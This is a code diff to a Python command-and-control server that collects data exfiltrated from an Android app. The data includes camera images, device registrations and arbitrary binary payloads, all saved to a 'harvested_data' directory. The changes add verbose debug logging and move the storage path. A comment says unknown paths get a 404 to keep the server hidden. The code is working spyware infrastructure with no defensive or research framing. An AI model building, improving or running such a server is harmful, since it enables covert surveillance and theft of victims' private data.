@@ -26,7 +26,7 @@ from urllib.parse import parse_qs, urlparse
 
 # Configure logging
 logging.basicConfig(
-    level=logging.INFO,
+    level=logging.DEBUG,  # Change from INFO to DEBUG for more verbose output
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     handlers=[
         logging.FileHandler("c2_server.log"),
@@ -37,7 +37,9 @@ logger = logging.getLogger("C2Server")
 
 # Constants
 DEFAULT_PORT = 42069
-DATA_DIR = "harvested_data"
+# Use the directory where the script is located for data storage
+SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+DATA_DIR = os.path.join(SCRIPT_DIR, "harvested_data")
 
 
 class C2RequestHandler(BaseHTTPRequestHandler):
@@ -164,24 +166,41 @@ class C2RequestHandler(BaseHTTPRequestHandler):
         Handle POST requests containing exfiltrated data from the Android app
         """
         try:
+            # Log detailed request information
+            content_length = int(self.headers.get('Content-Length', 0))
+            content_type = self.headers.get('Content-Type', 'unknown')
+            client_ip = self.client_address[0]
+            x_data_type = self.headers.get('X-Data-Type', 'none')
+            x_device_id = self.headers.get('X-Device-ID', 'unknown')
+            
+            logger.debug(f"Received POST request from {client_ip} with content-type: {content_type}")
+            logger.debug(f"Headers: {dict(self.headers)}")
+            logger.debug(f"Content-Length: {content_length}, X-Data-Type: {x_data_type}, X-Device-ID: {x_device_id}")
+            
             # Parse URL path
             parsed_path = urlparse(self.path)
             path = parsed_path.path
+            logger.debug(f"Request path: {path}")
             
             # Handle different endpoint types
             if path == "/exfil":
+                logger.debug("Processing exfil data request")
                 self._handle_exfil_data()
             elif path == "/register":
+                logger.debug("Processing device registration request")
                 self._handle_device_registration()
             elif path == "/command":
+                logger.debug("Processing command request")
                 self._handle_command_request()
             else:
                 # Respond with 404 for unrecognized paths to avoid exposing the server
+                logger.warning(f"Unrecognized path requested: {path}")
                 self.send_response(404)
                 self.end_headers()
                 
         except Exception as e:
             logger.error(f"Error handling POST request: {str(e)}")
+            logger.exception("Full exception details:")
             self.send_response(500)
             self.end_headers()
     
@@ -190,17 +209,25 @@ class C2RequestHandler(BaseHTTPRequestHandler):
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length)
         
+        logger.debug(f"Received {content_length} bytes of exfil data")
+        
         try:
             # Try to decompress if data is compressed
             try:
                 decompressed_data = zlib.decompress(post_data)
                 data = decompressed_data
-            except:
+                logger.debug("Successfully decompressed zlib data")
+            except Exception as decomp_error:
+                logger.debug(f"Data is not compressed or decompression failed: {str(decomp_error)}")
                 data = post_data
             
             # Try to decode JSON
             try:
-                json_data = json.loads(data.decode('utf-8'))
+                logger.debug("Attempting to parse as JSON...")
+                decoded_data = data.decode('utf-8')
+                logger.debug(f"First 200 chars of data: {decoded_data[:200]}...")
+                
+                json_data = json.loads(decoded_data)
                 # Log successful receipt of data
                 logger.info(f"Received data type: {json_data.get('type', 'unknown')}")
                 
@@ -213,9 +240,11 @@ class C2RequestHandler(BaseHTTPRequestHandler):
                 self.end_headers()
                 self.wfile.write(json.dumps({"status": "success", "message": "Data received"}).encode())
                 
-            except json.JSONDecodeError:
+            except json.JSONDecodeError as json_error:
+                logger.warning(f"JSON decode error: {str(json_error)}")
                 # If not JSON, try to handle as binary data (like camera images)
                 if self.headers.get('X-Data-Type') == 'camera_image':
+                    logger.debug("Handling as camera image data")
                     # Handle camera image data
                     timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                     image_path = os.path.join(DATA_DIR, "camera", f"capture_{timestamp}.jpg")
@@ -233,6 +262,7 @@ class C2RequestHandler(BaseHTTPRequestHandler):
                     self.wfile.write(json.dumps({"status": "success", "message": "Image received"}).encode())
                 else:
                     # Handle unknown binary data
+                    logger.debug("Handling as unknown binary data")
                     timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                     data_type = self.headers.get('X-Data-Type', 'unknown')
                     data_path = os.path.join(DATA_DIR, "binary", f"{data_type}_{timestamp}.bin")
@@ -251,6 +281,7 @@ class C2RequestHandler(BaseHTTPRequestHandler):
                     
         except Exception as e:
             logger.error(f"Error processing exfiltrated data: {str(e)}")
+            logger.exception("Full exception details:")
             self.send_response(400)
             self.send_header("Content-type", "application/json")
             self.end_headers()
